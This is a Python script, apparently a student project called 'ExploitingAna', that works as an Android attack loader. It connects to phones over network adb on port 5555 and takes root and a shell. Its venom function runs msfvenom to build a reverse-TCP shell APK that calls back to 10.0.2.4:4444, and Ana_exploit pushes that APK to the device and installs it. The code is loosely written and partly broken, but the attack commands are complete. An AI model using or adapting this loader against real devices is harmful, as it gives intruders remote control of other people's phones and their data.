import uiautomator, os, sys, time
from uiautomator import Device


# Creating a class for all the usable adb and payload creation commands

class exploit():
    def list_devices(self):
        os.system('adb devices | tee device_list.txt')

    def root_access(self):
        os.system('adb root')


    def connect(self):
        ip = input('Select a Mobile IP from the list :')
        os.system(f'adb connect {ip}:5555')

    def disconnect_all(self):
        os.system('adb disconnect')

    def get_shell(self):
        os.system(f'adb shell')

    def install_apk(self):
        device = input('Select a Mobile IP from the list : ')
        path = input(f'({device})->Path of the file: ')
        os.system(f'adb -s {device} install {path}')

    def venom(self):
        os.system('msfvenom -a android -p android/shell/reverse_tcp LHOST=10.0.2.4 LPORT=4444 R > android_shell.apk')



# #Implement display CLI
# 1. List of devices
# 2. Try Exploit


#Try to read the line with IP and display it - Option 1

def Ana_detect():
    exploit().list_devices()
    resultfile = open('device_list.txt', 'a+')
    result = resultfile.readlines()
    resultfile.close()
    if result != '':
        for i in range(len(result)):
            found_device = result[i].split(' ')
            print('Connected Device:',found_device)
    else:
        print('NO DEVICE FOUND!!')



#Try detecting Ana Version - Option 1
def Ana_version():
    exp = exploit()
    exp.connect()
    vers = os.system(f'adb shell getprop ro.build.version.release')
    print('Running Android version is ',vers)


#Try Normal Exploit - MakeAFool (Remove this section if not needed during submission)
def Ana_sHell():
    exp = exploit()
    exp.connect()
    exp.root_access()
    print('Please dont break me MOMMY ;_;')
    print('You have shell access for the Device!')
    exp.get_shell()

#Try to implement exploit - Option 2
def Ana_exploit():
    exp = exploit()
    exp.connect()
    exp.venom()
    os.system('adb push ./android_shell.apk /sdcard/Android ')
    os.system('adb install android_shell.apk')



def cli_display():
    print("  ______               _         _  _    _                                       ")
    print(" |  ____|             | |       (_)| |  (_)                  /\                  ")
    print(" | |__   __  __ _ __  | |  ___   _ | |_  _  _ __    __ _    /  \    _ __    __ _ ")
    print(" |  __|  \ \/ /| '_ \ | | / _ \ | || __|| || '_ \  / _` |  / /\ \  | '_ \  / _` |")
    print(" | |____  >  < | |_) || || (_) || || |_ | || | | || (_| | / ____ \ | | | || (_| |")
    print(" |______|/_/\_\| .__/ |_| \___/ |_| \__||_||_| |_| \__, |/_/    \_\|_| |_| \__,_|")
    print("               | |                                  __/ |                        ")
    print("               |_|                                 |___/                         ")
    print("+ -- --=[ExploitingAna v1.0.0]")
    print("+ -- --=[Android exploit loader. This project revolves around a python program that can detect, load and exploit vulnerable versions of Android.]")
    print("+ -- --=[https://github.com/notson00b/ExploitingAna]")
    print('\n')
    print('\n')
    print('1. Detect connected Android devices')
    print('2. Detect the version of Android devices')
    print('3. Get Shell Access')
    print('4. Try Exploit for the Android')


# def switch(opt):
#
#     switch = {
#         '1': Ana_detect(),
#         '2' : Ana_version(),
#         '3' : Ana_sHell(),
#         '4' : Ana_exploit()
#             }
#     return switch.get(switch(opt),'Select from the list....')



if __name__ == '__main__':
    cli_display()
    # op = input('Enter your choice: ')
    # switch(op)


    Ana_detect()
    #Ana_version()
    Ana_sHell()
    #Ana_exploit()